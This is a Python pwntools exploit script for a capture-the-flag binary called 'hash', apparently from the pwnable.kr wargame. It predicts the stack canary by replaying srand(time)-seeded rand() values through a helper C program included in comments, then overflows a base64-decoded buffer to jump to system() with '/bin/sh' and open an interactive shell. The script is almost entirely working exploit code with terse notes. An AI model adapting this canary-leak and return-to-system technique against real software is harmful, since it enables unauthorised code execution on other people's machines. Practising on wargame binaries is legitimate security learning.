from pwn import *
from pwnlib.util.packing import p32
import os, time

# p = remote('pwnable.kr', 9002)
p = process("./hash")
p.recvuntil("input captcha : ")
captcha = p.recvline().strip()
t = int(time.time())

# calculate canary
canary = "0x"+os.popen("./cal_can %s %s"%(t, captcha)).read().strip()
print(canary)
canary = int(canary, 16)
p.sendline(captcha)

p.recvuntil("Encode your data with BASE64 then paste me!\n")
# stack smash
payload = b'A'*0x200
payload += p32(canary)

sys_addr = 0x08049187
g_buf = 0x804b0e0
payload += b'B'*0xc
payload += p32(sys_addr)
payload += p32(g_buf + 0x2cc)

payload = b64e(payload)
payload += "/bin/sh\x00"
print(payload)
p.sendline(payload)

p.interactive()
p.close()

# pwn
# input takes 0x400 while Base64decode takes 0x200. Overflowed
# encode payload before sending
# need to get around canary
# The captcha leaks the canary by adding canary and srand(time)
# Get the time() by running code in pwnable server
# /bin/sh don't need encoding

# aux c code
# #include<stdio.h>
# #include<stdlib.h>
# #include<assert.h>
# int main(int argc, char **argv) 
# {
  # assert(argc==3);
  # int m = atoi(argv[2]);
  # int rands[8];
  # srand(atoi(argv[1]));
  # for (int i = 0; i <= 7; i++) rands[i] = rand();
  # m -= rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7];
  # printf("%x\n", m);
  # return 0;
# }
